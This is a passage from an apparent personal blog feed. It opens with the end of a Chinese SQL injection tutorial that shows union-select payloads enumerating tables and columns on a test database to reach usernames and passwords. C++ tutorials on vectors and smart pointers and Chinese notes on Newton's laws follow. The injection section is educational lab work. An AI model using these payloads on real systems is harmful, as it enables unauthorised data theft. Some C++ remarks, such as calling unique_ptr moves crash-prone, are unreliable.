alt="union2"></li><li>这句话查询了我们现在所在数据库的所有表名称，由于<code>test</code>数据库只有一张表<code>user</code>，这里只返回了一组数据，如果数据库有更多表，这段注入语句也能将其挖掘出来。但由于这是一个简陋的环境，此数据库只有目标表。</li><li>在真实环境中，我们很有可能是从一个回显其他表的地方开始注入，然后进行现在这个步骤才发现数据库有<code>user</code>表，然后以<code>user</code>表为渗透目标进行渗透。此例没有对环境额外做设计，但对实际问题时需要考虑到这里所说的情况。</li></ul><h4 id="Step4-1"><a href="#Step4-1" class="headerlink" title="Step4"></a>Step4</h4><ul><li>下一步就是进一步获取<code>user</code>表中的字段，此例主要是用户名和密码，比如<ul><li>user, username, user_name, name</li><li>password, passwd<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1, database(), user(), column_name from information_schema.columns where table_name=&#x27;</span><span class="keyword">user</span><span class="string">&#x27;; -- </span></span><br></pre></td></tr></table></figure><img src="https://s3.bmp.ovh/imgs/2023/05/01/727fdefdca3528cf.png" alt="union3"><br><img src="https://s3.bmp.ovh/imgs/2023/05/01/4def5cc3519f2774.png" alt="union4"></li></ul></li><li>我们发现出来了很多列，我没有全部截屏下来，但并不是所有列都是我们目标表的column，这是我故意留下的一个坑：在<code>mysql</code>库中也有一张<code>user</code>表，我们在这里检索到<code>user</code>的列中包括了<code>mysql.user</code>中的列。因此，我们创建数据表时一般会用<code>users</code>命名避免出现这种问题。</li><li>对此例的情况，我们需要区分哪些是我们所需要的字段。一个简单的办法是在自己的数据库中查询<code>mysql</code>中的列字段，然后排除，剩下的就是目标字段。此例中也比较明显，前面我们提到了<code>mysql</code>库主要是和权限有关的库。所以这里很多有_priv后缀的都是<code>mysql</code>库的，可以直接排除。或者对where增加一些限制：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1, database(), user(), column_name from information_schema.columns where table_name=&#x27;</span><span class="keyword">user</span><span class="string">&#x27; and table_schema = database(); -- </span></span><br></pre></td></tr></table></figure><img src="https://s3.bmp.ovh/imgs/2023/05/01/b79b851c5677068c.png" alt="union5"></li><li>筛选后的字段我们可以确定为：<ul><li>id</li><li>name</li><li>email</li><li>createtime</li><li>passwd</li><li>visibility</li></ul></li><li>获得了所有字段之后，我们就可以用union attack查询这个表中的任何信息。用同样的方法可以获取这个库中其他表的所有信息，由于此例只有一张表，而且方法已经介绍完了，我就不再做过多演示。当然，有时候你获得的密码可能是加密的，这就牵扯到解密问题了，此次我们不对此进行更多讨论。</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>此次我们了解了基本的SQL语句和一些常见的语法漏洞，并利用这些漏洞完成了一次人工注入。但是，对于现实环境，很多时候人工注入是难以完成的。比如网站对<code>&#39;</code>或<code>--</code>进行了过滤，我们基本就用不了此例的注入了。或者对输入字符max值做了限制，后面的union attack由于注入语句过长，也难以成功。实际上，现在SQL注入大多借助了注入工具，比如sqlmap。或许在后面的博客中我们会继续讨论这些话题，敬请期待。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Cyber Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cyber Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vector</title>
      <link href="/2023/04/26/C%20or%20C++/vector/"/>
      <url>/2023/04/26/C%20or%20C++/vector/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h1><ul><li>Hey folks! Today we are going to dive into the world of C++ vectors. In this blog, we will cover the basics of using vectors and explore the fundamental syntax of vectors. We will also touch upon some related techniques that you wonld not want to miss.</li></ul><ul><li>I would like to give a special thanks to <a href="https://www.youtube.com/user/TheChernoProject/">@The Cherno</a> for teaching me C++ through his C++ series on YouTube. Please subscribe to his channel if possible!</li></ul><h2 id="Brief-intro"><a href="#Brief-intro" class="headerlink" title="Brief intro"></a>Brief intro</h2><ul><li>Vector is a powerful datatype in the C++ standard library that functions similarly to an array list. Although its name may suggest a relation to mathematical vectors, it is actually quite different. One of its notable features is the ability to dynamically change its size and query its current size. Let’s dive into the details.</li></ul><h2 id="Simple-demo"><a href="#Simple-demo" class="headerlink" title="Simple demo"></a>Simple demo</h2><ul><li>Here is a simple demo to showcase the basic usage of vectors in C++. Most of the important points are explained in the comments:<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span> <span class="comment">// include the vector library to use vectors</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Define a struct called Vertex with three float values</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vertex</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">float</span> x, y, z;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Vertex</span>(<span class="type">float</span> x, <span class="type">float</span> y, <span class="type">float</span> z)</span><br><span class="line">        : <span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">z</span>(z) <span class="comment">// initialization list</span></span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Define an overloaded operator&lt;&lt; function to allow printing of Vertex objects to std::cout</span></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; stream, <span class="type">const</span> Vertex vertex)</span><br><span class="line">&#123;</span><br><span class="line">stream &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; vertex.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; vertex.y &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; vertex.z &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> stream;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Main function</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::vector&lt;Vertex&gt; vertices; <span class="comment">// create a vector of Vertex objects called vertices</span></span><br><span class="line"></span><br><span class="line">vertices.<span class="built_in">push_back</span>(&#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span> &#125;); <span class="comment">// add a new Vertex object with x=1, y=2, and z=3 to the end of the vector</span></span><br><span class="line">vertices.<span class="built_in">push_back</span>(&#123; <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span> &#125;); <span class="comment">// add another Vertex object with x=4, y=5, and z=6 to the end of the vector</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Loop through each element in the vector and print its value using the overloaded &lt;&lt; operator</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; vertices.<span class="built_in">size</span>(); i++)</span><br><span class="line">std::cout &lt;&lt; vertices[i] &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">vertices.<span class="built_in">erase</span>(vertices.<span class="built_in">begin</span>() + <span class="number">1</span>); <span class="comment">// remove the second element (index 1) from the vector</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Loop through each element in the vector using a range-based for loop and print its value using the overloaded &lt;&lt; operator</span></span><br><span class="line"><span class="keyword">for</span> (Vertex&amp; v : vertices)</span><br><span class="line">std::cout &lt;&lt; v &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>(); <span class="comment">// wait for user input before closing the program</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>Here are some important things to keep in mind when using vectors in C++:<ol><li>Make sure to <strong>include</strong> the vector library in your code so that you can use the vector class.</li><li>Add data to the end of the vector using the push_back() method.</li><li>Remove data using the erase() method with the index of the element you want to remove.</li><li>You can obtain the initial location of the vector by calling the begin() method.</li><li>Unlike Java, where a class is required to be the vector’s data type, in C++, we can use basic types such as int as the vector’s data type</li></ol></li></ul><ul><li>In this demo, we’ve used some interesting techniques that are worth noting:<ol><li>Overloading the &lt;&lt; operator to customize output for the vector. (We will talk about overloading operator in another blog)</li><li>Copying data can be slow and inefficient, so using references (&amp;) can help avoid this issue.</li><li>We are using a <strong>range-based</strong> for loop here, which Python programmers might find familiar.</li><li>The initialization list for Vertex class is defined within the class itself. (Further details about initialization lists may be discussed in a future blog post)</li></ol></li></ul><h2 id="Optimization-of-vector"><a href="#Optimization-of-vector" class="headerlink" title="Optimization of vector"></a>Optimization of vector</h2><ul><li>The above simple demo just show basic usage of vector, which can be slow and inefficient without any optimization.</li></ul><ul><li>Normal vectors have various limitations, but for today, we will focus on addressing the issue of copying to improve their performance.</li></ul><h3 id="Avoid-copy"><a href="#Avoid-copy" class="headerlink" title="Avoid copy"></a>Avoid copy</h3><ul><li>The best way to optimize is knowing the environment we are working with. Thus, we need to identify where the vector is being copied. Here is an example code:<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vertex</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">float</span> x, y, z;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Vertex</span>(<span class="type">float</span> x, <span class="type">float</span> y, <span class="type">float</span> z)</span><br><span class="line">: <span class="built_in">x</span>(x), <span class="built_in">y</span>(y), <span class="built_in">z</span>(z)</span><br><span class="line">&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Vertex</span>(<span class="type">const</span> Vertex&amp; vertex)</span><br><span class="line">: <span class="built_in">x</span>(vertex.x), <span class="built_in">y</span>(vertex.y), <span class="built_in">z</span>(vertex.z)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// highlight that our vector is copied</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Copied!&quot;</span> &lt;&lt; std::endl; </span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">vertices.<span class="built_in">push_back</span>(<span class="built_in">Vertex</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));<span class="comment">//line 23</span></span><br><span class="line">vertices.<span class="built_in">push_back</span>(<span class="built_in">Vertex</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>));</span><br><span class="line">    vertices.<span class="built_in">push_back</span>(<span class="built_in">Vertex</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>));</span><br><span class="line"></span><br><span class="line">std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li>Running the above code, we get six “Copied” in the console.</li></ul><h4 id="Avoid-copy-result-from-reallocation"><a href="#Avoid-copy-result-from-reallocation" class="headerlink" title="Avoid copy result from reallocation"></a>Avoid copy result from reallocation</h4><ul><li>Once a vector’s capacity is exceeded, it needs to reallocate new memory which involves copying data to a new location, deleting old data, and adding new data. This process can be slow and inefficient, and it is where we begin the optimization process.</li></ul><ul><li>Every time the <code>push_back()</code> method is called, the vertices vector is reallocated due to its size not being sufficient. To optimize this, we can call the <code>reserve()</code> method to specify that the size of the vector should be 3, thereby avoiding unnecessary reallocations.</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   ...<span class="comment">// omit</span></span><br><span class="line">   std::vector&lt;Vertex&gt; vertices;</span><br><span class="line">   </span><br><span class="line">   <span class="comment">// state that the size should be 3</span></span><br><span class="line">   vertices.<span class="built_in">reserve</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">vertices.<span class="built_in">push_back</span>(<span class="built_in">Vertex</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">vertices.<span class="built_in">push_back</span>(<span class="built_in">Vertex</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>));</span><br><span class="line">   vertices.<span class="built_in">push_back</span>(<span class="built_in">Vertex</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>));</span><br><span class="line">...</span><br></pre></td></tr></table></figure><ul><li>In the given code, calling <code>reserve(3)</code> before adding the elements will optimize the performance by avoiding three unnecessary memory reallocations and copying.</li><li>After using the <code>reserve()</code> method, we will only get 3 “Copied”.</li></ul><h4 id="Avoid-copy-caused-by-constructing-function"><a href="#Avoid-copy-caused-by-constructing-function" class="headerlink" title="Avoid copy caused by constructing function"></a>Avoid copy caused by constructing function</h4><ul><li>In the example code, lines 29-30 create a Vertex in the main scope using a constructor, and then copy it to the vector. This is inefficient and can be improved by using the <code>emplace_back()</code> method instead.<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   vertices.<span class="built_in">emplace_back</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">vertices.<span class="built_in">emplace_back</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">   vertices.<span class="built_in">emplace_back</span>(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure></li><li>The <code>emplace_back()</code> method pass parameters list directly to the constructor, avoiding unnecessary copy.</li></ul><ul><li>After applying the optimization mentioned above, rerun the code and you will observe that there are no “Copied” statements being printed in the console.</li></ul>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Smart pointer</title>
      <link href="/2023/04/21/C%20or%20C++/smart_ptr/"/>
      <url>/2023/04/21/C%20or%20C++/smart_ptr/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Smart-pointer"><a href="#Smart-pointer" class="headerlink" title="Smart pointer"></a>Smart pointer</h1><ul><li>Hey guys! It has been several days since I last wrote a blog like this. I have been busy with mid-term exams for days. But now I’m back!</li><li>This is the first time I have written a blog entirely in English. Some statements or terminology may sound strange or be incorrect, but  I am excited to start and improve my skills in English blogging. There are several reasons for this, but the main ones are as follows:<ol><li>Practicing English.</li><li>Becoming familiar with terminology in the computer  science field.</li><li>Having a better ability to learn English materials related to computer science.</li></ol></li></ul><ul><li>I would like to give a special thanks to <a href="https://www.youtube.com/user/TheChernoProject/">@The Cherno</a> for teaching me C++ through his C++ series on YouTube. Please subscribe to his channel if possible!</li></ul><h2 id="Brief-Introduction"><a href="#Brief-Introduction" class="headerlink" title="Brief Introduction"></a>Brief Introduction</h2><ul><li>Smart pointers can help you manage your memory automatically, preventing the issue of forgetting to call “delete” to free memory allocated by “new”.</li></ul><h2 id="Premise"><a href="#Premise" class="headerlink" title="Premise"></a>Premise</h2><ul><li>We have some libs included and the class “Entity”.<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> <span class="comment">//include smart pointer</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Entity</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Entity</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Created Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ~<span class="built_in">Entity</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Destroyed Entity!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="unique-ptr"><a href="#unique-ptr" class="headerlink" title="unique_ptr"></a>unique_ptr</h2><ul><li>We have an simple demo of <code>unique_ptr</code> here. Notice that the curly braces just for marking the scope.<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">... <span class="comment">// We omit the previous code</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    &#123;<span class="comment">// explicit &quot;must use the construction function&quot;</span></span><br><span class="line">        </span><br><span class="line">        std::unique_ptr&lt;Entity&gt; entity = std::<span class="built_in">make_unique</span>&lt;Entity&gt;();</span><br><span class="line"></span><br><span class="line">        entity-&gt;<span class="built_in">Print</span>();</span><br><span class="line">    &#125;<span class="comment">// the curly braces mark the scope</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//end of main</span></span><br><span class="line">    std::cin.<span class="built_in">get</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>The <code>unique_ptr</code> <strong>cannot be copied</strong>! And that is the meaning of its name. This means that you cannot use unique_ptr like this:<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Example</span></span><br><span class="line">&#123;</span><br><span class="line">    ...<span class="comment">//omit</span></span><br><span class="line">&#125;;</span><br><span class="line">...<span class="comment">//omit</span></span><br><span class="line">    std::unique_ptr&lt;Example&gt; uniq_ptr = std::<span class="built_in">make_unique</span>&lt;Example&gt;();</span><br><span class="line">    <span class="type">void</span>* ptr</span><br><span class="line">    ptr = uniq_ptr <span class="comment">// invalid, you can&#x27;t copy uniq_ptr</span></span><br></pre></td></tr></table></figure></li><li>If you try to do so, you will find that the compiler throws an error. You can find the reason in the place where <code>unique_ptr</code> is defined or just check it in Cherno’s C++ series.</li><li>But hey, if you’re feeling rebellious and want to break the rules, there are some tricky ways to move a unique_ptr around using move constructors and assignment operators. Just don’t blame me when your program crashes and burns faster than a flaming marshmallow!</li></ul><h2 id="shared-ptr"><a href="#shared-ptr" class="headerlink" title="shared_ptr"></a>shared_ptr</h2><ul><li>The <code>shared_ptr</code> is implemented using a <strong>counter</strong>.</li><li>When another <code>shared_ptr</code> shares an existing pointer, the counter is incremented.</li><li>When a shared_ptr is deleted, the counter is decremented.</li><li>The memory will only be freed when the counter reaches zero.</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::shared_ptr&lt;Entity&gt; entity;</span><br><span class="line">    <span class="comment">// we created entity here, but didn&#x27;t initialize</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::shared_ptr&lt;Entity&gt; shared_entity = std::<span class="built_in">make_shared</span>&lt;Entity&gt;();</span><br><span class="line"></span><br><span class="line">        entity = shared_entity; <span class="comment">// we didn&#x27;t fulfill operator useability here</span></span><br><span class="line"></span><br><span class="line">        entity-&gt;<span class="built_in">Print</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ptr &quot;shared_entity&quot; is unavaible here, but it&#x27;s memory isn&#x27;t free</span></span><br><span class="line">    <span class="comment">// because ptr &quot;entity&quot; hold it&#x27;s memory</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="weak-ptr"><a href="#weak-ptr" class="headerlink" title="weak_ptr"></a>weak_ptr</h2><ul><li><code>weak_ptr</code> can be considered a special kind of <code>shared_ptr</code>. It can refer to a <code>shared_ptr</code>, but doesn’t affect the reference count.<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::weak_ptr&lt;Entity&gt; entity;</span><br><span class="line">    <span class="comment">// we created entity here, but didn&#x27;t initialize</span></span><br><span class="line">    &#123;</span><br><span class="line">        std::shared_ptr&lt;Entity&gt; shared_entity = std::<span class="built_in">make_shared</span>&lt;Entity&gt;();</span><br><span class="line"></span><br><span class="line">        entity = shared_entity;</span><br><span class="line"></span><br><span class="line">        shared_entity-&gt;<span class="built_in">Print</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// shared_entity died here because the counter turn to 0.</span></span><br><span class="line">    <span class="comment">//but we can ask weak_ptr whether it&#x27;s memory was free</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>After all <code>shared_ptr</code> instances have been destroyed, a <code>weak_ptr</code> cannot hold the memory. However, we can use a <code>weak_ptr</code> to check whether its associated memory has been freed. It is like asking it, “Hey, is your memory freed?”.</li></ul><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ul><li>In summary, smart pointers in C++ are used to manage memory allocation and deallocation automatically to avoid memory leaks and dangling pointers. We mainly covers the most commonly used smart pointers in C++. They are implemented as templates and have three types: <code>unique_ptr</code>, <code>shared_ptr</code>, and <code>weak_ptr</code>.</li></ul><ul><li><code>unique_ptr</code> is used to manage exclusive ownership of an object, meaning that it cannot be copied and can only be moved. It is useful when <strong>a single object</strong> is managed by one pointer, and the object should be automatically destroyed when the pointer is out of scope.</li></ul><ul><li><code>shared_ptr</code> is used to manage shared ownership of an object, meaning that multiple pointers can refer to the same object. It uses <strong>reference counting</strong> to keep track of how many pointers are referring to the object, and the object is automatically destroyed when the reference count goes to zero.</li></ul><ul><li><code>weak_ptr</code> is used in conjunction with shared_ptr to <strong>avoid cyclic dependencies</strong>, where objects refer to each other in a way that cannot be broken. It provides a non-owning reference to an object managed by shared_ptr, and can be used to check whether the object has been destroyed. (Actually I am not familiar with weak_ptr, so I just search some material through Internet. May be we will talk about it later.)</li></ul><ul><li>Overall, smart pointers are a powerful feature in C++ that allow for more reliable memory management, and can help prevent common programming errors related to memory allocation and deallocation.</li></ul>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>牛顿运动定律</title>
      <link href="/2023/04/15/Physic/Chapter_2/"/>
      <url>/2023/04/15/Physic/Chapter_2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="牛顿运动定律"><a href="#牛顿运动定律" class="headerlink" title="牛顿运动定律"></a>牛顿运动定律</h1><center><font face="宋体" size="5"> 牛顿定律是瞬时的规律。 </font></center><h2 id="牛顿第一定律"><a href="#牛顿第一定律" class="headerlink" title="牛顿第一定律"></a>牛顿第一定律</h2><ul><li>一切物体都有保持其运动状态不变的性质</li><li>对于地面上一般的（宏观低速）力学现象，地面参考系是一个足够精确的惯性系</li></ul><h2 id="牛顿第二定律"><a href="#牛顿第二定律" class="headerlink" title="牛顿第二定律"></a>牛顿第二定律</h2><ul><li>定义质点动量：$\overrightarrow{p}=m\overrightarrow{v}$</li><li>质点受的合外力等于质点的质量与其加速度的乘积<ul><li>$\overrightarrow{F}=m\overrightarrow{a}$</li></ul></li><li>某时刻质点<strong>动量对时间的变化率</strong>等于该时刻作用于质点上的<strong>所有力的合力</strong>，而且该式是一个<strong>瞬时关系</strong><ul><li>$\overrightarrow{F}=\dfrac{d\overrightarrow{p}}{dt}$</li></ul></li><li>力在时间上的积累等于动量的增量<ul><li>$\Delta \overrightarrow{p}=\overrightarrow{F}\Delta t$</li></ul></li></ul><h2 id="牛顿第三定律"><a href="#牛顿第三定律" class="headerlink" title="牛顿第三定律"></a>牛顿第三定律</h2><ul><li>两个物体之间的作用力与反作用力：<ul><li>大小相等</li><li>方向相反</li><li>沿同一直线作用在两个物体上</li><li>力的性质相同</li></ul></li></ul><h2 id="力学中常见的力"><a href="#力学中常见的力" class="headerlink" title="力学中常见的力"></a>力学中常见的力</h2><h3 id="四种力"><a href="#四种力" class="headerlink" title="四种力"></a>四种力</h3><ul><li>以下四种力是目前已知最基本的力，其他种类力可以被视为它们的组合（弱电统一理论）</li></ul><ul><li>万有引力<script type="math/tex; mode=display">F=-G\dfrac{m_1 m_2}{(R+h)^2}\overrightarrow{e_r} \qquad G \approx 6.67 \times 10^{-11}m^3 \cdot {kg}^{-1} \cdot s^{-2}</script></li></ul><ul><li>电磁力<script type="math/tex; mode=display">f_电=k\dfrac{qQ}{r^2}</script></li></ul><ul><li>强力<ul><li>强子间的作用力：核子、介子</li><li>引力</li><li>斥力</li></ul></li></ul><ul><li>弱力<ul><li>粒子间的短程力</li></ul></li></ul><h3 id="其他力"><a href="#其他力" class="headerlink" title="其他力"></a>其他力</h3><ul><li>重力<script type="math/tex; mode=display">P=mg=G\dfrac{M m}{(R+h)^2} \approx G\dfrac{M m}{R^2} \qquad (\mathrm{approx \enspace when} \enspace h \ll R)</script></li></ul><ul><li>弹力<ul><li>弹性形变 $\Rightarrow$ 弹力</li><li>在弹性限度内：$F=-kx$，其中k为弹性系数</li></ul></li></ul><ul><li>摩擦力<ul><li>静摩擦力：与<strong>合外力</strong>大小相等，方向相反</li><li>滑动摩擦力：$f=\mu F_N$，其中 $\mu$ 为摩擦因数，$F_N$ 为正压力</li></ul></li></ul><h2 id="惯性系与非惯性系"><a href="#惯性系与非惯性系" class="headerlink" title="惯性系与非惯性系"></a>惯性系与非惯性系</h2><h3 id="惯性系"><a 